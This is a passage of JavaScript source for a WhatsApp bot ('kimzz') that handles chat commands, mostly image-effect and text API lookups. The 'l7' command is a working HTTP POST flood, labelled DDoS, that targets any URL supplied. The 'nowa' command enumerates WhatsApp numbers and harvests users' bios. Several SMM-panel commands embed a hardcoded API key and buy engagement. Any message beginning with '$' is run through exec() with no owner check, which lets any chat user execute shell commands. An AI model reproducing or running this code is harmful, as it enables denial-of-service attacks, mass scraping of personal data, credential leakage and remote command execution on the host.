${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v => v.length)), ' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
        newReply(respon)
      }

      //=============== PHOTOOXY MENU  ==============
      break
      case 'toilet':
      case 'place':
      case 'burning':
      case 'shattered':
      case 'mirrors':
      case 'iphone':
      case 'flame':
      case 'memory':
      case 'nature': {
        if (!isMedia) return newReply("reply image")
        let media = await kimzz.downloadAndSaveMediaMessage(quoted)
        let anu = await TelegraPh(media)
        kimzz.sendMessage(from, { image: { url: `https://${domainApi}/api/photooxy/${command}?url=${anu}&apikey=kimzzstore` }, caption: mess.succes }, { quoted: m })
      }
      //=============== ephotomenu 1 ==============
      break
      case 'wood':
      case 'quotestatus':
      case 'writestatus':
      case 'heated':
      case 'buoys': {
        if (args.length == 0) return newReply(`Example: ${prefix + command} kimzz|store`)
        const [text1, text2] = args[0].split('|');
        if (!text1 || !text2) {
          return newReply('Sila masukkan dua teks dengan "|" separator, contoh: text1|text2');
        }
        const result = await getBuffer(`https://${domainApi}/api/ephoto/${command}?text=${text1}&text2=${text2}&apikey=kimzzstore`)
        kimzz.sendMessage(from, { image: ini_buffer, caption: mess.succes }, { quoted: m })
      }
      break
      case 'scholes':
      case 'juventus': {
        if (args.length == 0) return reply(`Example: ${prefix + command} kimzz|7`)
        const [text1, text2] = args[0].split('|');
        if (!text1 || !text2) {
          reply(`contoh: ${prefix + command} kimzz|7`)
        }
        const result = await getBuffer(`https://${domainApi}/api/ephoto/${command}?text=${text1}&number=${text2}&apikey=${apikey}`)
        kimzz.sendMessage(from, { image: result, caption: '🍁 Ini hasilnya ^_^' }, { quoted: m })
      }
      //=============== ephotomenu 2 ==============
      break
      case 'television':
      case 'glasses':
      case 'neonbp':
      case 'coverpubg':
      case 'greenbrush':
      case 'eraser':
      case 'dragonfire':
      case 'cloud': {
        if (!text) return newReply(`Example: ${prefix + command} kimzzstore`)
        ini_buffer = await getBuffer(`https://${domainApi}/api/ephoto/${command}?text=${text}&apikey=kimzzstore`)
        kimzz.sendMessage(from, { image: ini_buffer, caption: mess.succes }, { quoted: m })
      }
      //=========== randommenu =============
      break
      case 'sahabat':
      case 'cinta':
      case 'perjuangan':
      case 'horor':
      case 'lucu': {
        const result = await fetchJson(`https://${domainApi}/api/random/cerpen/${command}?apikey=${apikey}`)
        const kimzz = `result from story ${command}\n
- Title: ${result.result.title}
- Author: ${result.result.author_name}
- Story: ${result.result.story}`
        reply(kimzz)
      }
      break
      case 'darkjokes': {
        const result = await getBuffer(`https://${domainApi}/api/random/darkjoke?apikey=${apikey}`)
        kimzz.sendMessage(from, { image: result, caption: '🍁 Ini Random Dark Jokes Nya' }, { quoted: m })
      }

      break
      case 'ceksmm':
      if (!isCreator) return 
      const apiKey = 'fHUzibTi4pCmI442H4yDQAKF4';

      const apiUrl = 'https://mrxpanel.com/api/profile';

      const requestData = {
        api_key: apiKey
      };

      // Melakukan permintaan ke endpoint dengan metode POST
      axios.post(apiUrl, requestData)
        .then(response => {
          const result = response.data;
          if (result.status) {
            let kimzz = `_*Profile Akun SMM Panel Anda*_\n\n`
            kimzz += `Full Name: ${result.data.full_name}\n`;
            kimzz += `Username: ${result.data.username}\n`;
            kimzz += `Balance: ${result.data.balance}`;
            reply(kimzz);
          } else {
            reply('Permintaan berhasil, tetapi status tidak benar.');
          }
        })
        .catch(error => {
          console.error('Kesalahan dalam melakukan permintaan:', error.message);
          reply('Kesalahan dalam melakukan permintaan');
        });
      break
      case 'smmlist': {
        if (!isCreator) return 
        await reply('sedang mendapatkan list SMM 🔍 ...')
        let smmkey = "fHUzibTi4pCmI442H4yDQAKF4"
        let data = {
          api_key: smmkey,
        }
        fetch(`https://mrxpanel.com/api/services`, {
          method: 'POST',
          body: JSON.stringify(data),
          headers: {
            'Content-Type': 'application/json'
          }
        })
          .then(response => response.json())
          .then((data) => {
            var teks = '*_List Layanan SMM panel_*\n\n'
            let GG = 0
            for (let x of data.data) {
              teks += `🆔 id: ${x.id}\n🧨Nama : ${x.name}\n🛒 Kategori : ${x.category}\n💸Price : Rp${x.price}\n📔Deks : ${x.description}\n🦕Type : ${x.type}\n🎈Min Order : ${x.min}\n🌼Max Order : ${x.max}\n Stok : ${x.status}\n\n`
            }
            reply(teks)
          })
      }
      break
      case "deposit-smm": {
        reply(`_*Hello ${pushname}*_\n_Sila Deposit langsung ke SMM panel nya , Sekian Terima Gaji_`)
      }
      break
      case "cektrx": {
        if (!isCreator) return;
        if (!text) {
          let errorMessage = '⚠️ *Format salah!*\n\nContoh :\n*_cektrx 11012_*';

          return kimzz.sendMessage(m.chat, { text: errorMessage })
        }
        let [refid] = text.split(" ");
        let apikeysmm = "fHUzibTi4pCmI442H4yDQAKF4"
        let data = {
          api_key: apikeysmm,
          id: refid,
        };
        let response = await fetch('https://mrxpanel.com/api/status', {
          method: 'POST',
          body: JSON.stringify(data),
          headers: {
            'Content-Type': 'application/json'
          }
        });
        let result = await response.json();
        if (result.status == false) {
          reply(`\n\nPermasalahan :\n${result.data.message} `)
        } else {
          let successMessage = `*──  「 STATUS SUNTIK 」  ──*

_🆔 Tujuan: ${result.data.target}_
_✨ Harga : ${result.data.price}_
_🧾 Waktu : ${result.data.start_count}_
_📝 Jumlah  : ${result.data.remains}_
_🔢 Status_ : ${result.data.status}
`;

          kimzz.sendMessage(m.chat, { text: successMessage })
        }
      }
      break
      case "suntik": {
        if (!isCreator) return 
        if (!text) return reply(`Contoh: .suntiksmm 25 https://youtube.com/shorts/z4tojQ3PmWY?feature=shared 100000`);

        // Membagi teks menggunakan spasi
        const [id, target, jumlah] = text.split(' ');

        if (!id || !target || !jumlah) {
          reply(`Contoh: ${prefix + command} id url jumlah`);
        }

        const apikeysmm = "fHUzibTi4pCmI442H4yDQAKF4";

        const data = {
          api_key: apikeysmm,
          service: parseInt(id), // Pastikan id berupa integer
          target: target,
          quantity: parseInt(jumlah), // Pastikan jumlah berupa integer
        };

        fetch('https://mrxpanel.com/api/order', {
          method: 'POST',
          body: JSON.stringify(data),
          headers: {
            'Content-Type': 'application/json'
          }
        })
          .then(response => response.json())
          .then(res => {
            if (res.status) { // Periksa status respon
              const captain = `*── 「 TRANSAKSI BERHASIL 」──*\n\nID : ${res.data.id}\n\n*_Untuk cek transaksi silahkan ketik = .cektrx id_*`;
              reply(captain)
            } else {
              reply(`Gagal melakukan pemesanan. Pesan: ${res.data.message}`);
            }
          })
          .catch(error => {
            console.error('Kesalahan dalam melakukan permintaan:', error.message);
            reply('Kesalahan dalam melakukan permintaan');
          });
      }
      break
      case 'nowa': {
        if (!isCreator) return newReply(mess.OnlyOwner)
        if (!args[0]) return reply(`Kirim perintah ${prefix + command} <nomber>`)
        var noteks = args[0]
        if (!noteks.includes('x')) return m.reply('Salah Tuan Bukan Begitu Xixi')
        reply('Wait Tuan Sedang Kami Proses⏳')
        function countInstances(string, word) {
          return string.split(word).length - 1;
        }
        var nomer0 = noteks.split('x')[0]
        var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
        var random_length = countInstances(noteks, 'x')
        var random;
        if (random_length == 1) {
          random = 10
        } else if (random_length == 2) {
          random = 100
        } else if (random_length == 3) {
          random = 1000
        }
        var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
        var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
        var no_watsap = `\nTidak Terdaftar\n`
        for (let i = 0; i < random; i++) {
          var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
          var dom1 = nu[Math.floor(Math.random() * nu.length)]
          var dom2 = nu[Math.floor(Math.random() * nu.length)]
          var dom3 = nu[Math.floor(Math.random() * nu.length)]
          var dom4 = nu[Math.floor(Math.random() * nu.length)]
          var rndm;
          if (random_length == 1) {
            rndm = `${dom1}`
          } else if (random_length == 2) {
            rndm = `${dom1}${dom2}`
          } else if (random_length == 3) {
            rndm = `${dom1}${dom2}${dom3}`
          } else if (random_length == 4) {
            rndm = `${dom1}${dom2}${dom3}${dom4}`
          }
          var anuku = await kimzz.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
          var anuu = anuku.length !== 0 ? anuku : false
          try {
            try {
              var anu1 = await kimzz.fetchStatus(anuku[0].jid)
            } catch {
              var anu1 = '401'
            }
            if (anu1 == '401' || anu1.status.length == 0) {
              no_bio += `wa.me/${anuku[0].jid.split("@")[0]}\n`
            } else {
              nomerny += `wa.me/${anuku[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Kuala_Lumpur').format('HH:mm:ss DD/MM/YYYY')}\n\n`
            }
          } catch {
            no_watsap += `${nomer0}${i}${nomer1}\n`
          }
        }
        reply(`${nomerny}${no_bio}${no_watsap}`)
      }
      break
      case "l7": {
        if (!isCreator) return;
        if (!text) return reply("Masukkan [url] [waktu] [req]");
        if (!args[0].match("http")) return m.reply(`Masukkan link yang benar!!`);
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        try {
          url = text.split(" ")[0];
          time = text.split(" ")[1];
          req = text.split(" ")[2];
          await reply(`Running Debug send DDoS during *${time}* seconds attack on *${url}* with *${req}* request and methode *POST*`)
          for (let i = 0; i < req; i++) {
            setTimeout(async () => {

              await cloud.post(url, {
                headers: {
                  'User-Agent': random_ua.generate(),
                }
              });
            }, time * 100);
          }
          await delay(time * 100);
          reply(`*[ Kimzz Attacker ]*\n\nDone send DDoS during *${time}* seconds attack on *${url}* with *${req}* request and methode *POST*`);
        } catch (err) {
          console.log(err)
          reply(`gagal ddos website *${url}* tersebut`)
          fs.appendFile('error.txt', `${new Date().toISOString()}: ${err.stack}\n`, (fileErr) => {
            if (fileErr) {
              console.log('Gagal menyimpan pesan kesalahan ke dalam file:', fileErr);
            }
          });
        }
      }
      break
      case "aivoice": {
      if (!text) return reply('sila masukkan text yang ingin ditanyakan')
      await reply('*w r i t i n g...*')
      try {
        kimzz.sendMessage(from, { audio: { url: `https://${domainApi}/api/openai/gptvoice?query=${text}&apikey=${apikey}` }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
      } catch (err) {
        console.log(err)
        reply('server api sedang maintance')
      }
    }
      case 'error.txtt': {
        var mesek = text && m.quoted ? (m.quoted.text ? text + '\n\n' + m.quoted.text : text) : text ? text : (m.quoted ? (m.quoted.text ? m.quoted.text : false) : false);
        if (!mesek) return reply('Hello, can I help you?');

        // Pastikan struktur objek db telah diinisialisasi
        kimzz.ai = kimzz.ai ? kimzz.ai : {
          last_answer: 0
        }

        if (!game.ai) {
          game.ai = {
            id: m.sender,
            is_first: true,
            data: []
          };
        }

        var obj = {
          role: 'user',
          content: mesek
        };

        game.ai.data.push(obj);

        var delayTime = 5 * 1000; // Delay dalam milidetik
        var timeElapsed = Date.now() - (kimzz.ai.last_answer || 0);
        var remainingTime = Math.max(delayTime - timeElapsed, 0);

        // Tunggu hingga batas waktu tertentu
        await delay(remainingTime);

        try {
          var Actor = `You are a cultivator who has penetrated the immortal realm, you are called Zeiyy who meditates in the core of the earth, you are the best in the world where everyone bows to you, and to every question you always add a response boasting of being the strongest and most knowledgeable cultivator.`;

          await m.reply('*w r i t i n g. . .*');

          // Ganti URL API OpenAI dengan yang benar
          var response = await axios.request('https://skizo.tech/api/openai?apikey=kimzz', {
            method: 'POST',
            data: {
              messages: game.ai.data,
              system: Actor
            }
          });

          if (!game.ai.is_first) clearTimeout(game.ai.expired);

          // Tambahkan data baru ke game.ai.data
          game.ai.data.push({
            role: 'assistant',
            content: response.data.result
          });

          // Setel is_first menjadi false
          game.ai.is_first = false;

          // Atur waktu habis untuk game.ai
          game.ai.expired = setTimeout(() => {
            clearTimeout(game.ai.expired);
            // Hapus game.ai setelah 5 menit
            delete game.ai;
          }, 5 * 60 * 1000);

          kimzz.ai.last_answer = Date.now();

          // Ganti kimzz.reply dengan sesuai metodenya
          var { id } = await kimzz.sendMessage(m.chat, { text: response.data.result }, { quoted: m });
          game.ai.id = id;
        } catch (e) {
          console.error(e);
          m.reply('Oops, an error occurred.');
        }
        break;
      }
      break
      case 'afk': {
        let user = global.db.data.users[m.sender]
        user.afkTime = + new Date
        user.afkReason = text
        newReply(`💤 *${m.pushName}* Telah Afk${text ? ': ' + text : ''}`)
      }
      break
      case 'ceklimit':
      case 'checklimit':
      case 'limit': {
        newReply('Your Limit: ' + (db.data.users[m.sender].limit))
      }
      break
      case "dalle":
      if (!text) return reply('image apakah yang ingin anda buat ?')
      const model = "lexica"
      try {
        await m.reply('_Creating This Image... 🛠_')
        const tr = await fetchJson(`https://${domainApi}/api/openai/drawimage?text=${text}&model=${model}&apikey=${apikey}`)
        var result = await tr.result.image_data
        var caption = await tr.result.image_prompt
        await kimzz.sendImage(m.chat, result, caption, m)
      } catch (err) {
        console.log(err)
        m.reply('{\nstatus: 503,\nmessage: server maintance, please try again later\n}')
      }

      break
      case 'restart': {
        await loading()
        if (!isCreator) return;
        await m.reply('Memulai ulang bot... ⏳');
        process.exit()
      }

      break
      default:
    }
    if (budy.startsWith('$')) {
      exec(budy.slice(2), (err, stdout) => {
        if (err) return reply(err)
        if (stdout) return reply(stdout)
      })
    }
    if (budy.startsWith(">")) {
      if (!isOwner) return reply(mess.only.owner)
      try {
        let evaled = await eval(budy.slice(2))
        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
        await reply(evaled)
      } catch (err) {
        reply(String(err))
      }
    }
  } catch (e) {
    console.log(e)
    kimzz.sendMessage(`${global.owner}@s.whatsapp.net`, { text: `${util.format(e)}` })
  }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright(`Update ${__filename}`))
  delete require.cache[file]
  require(file)
})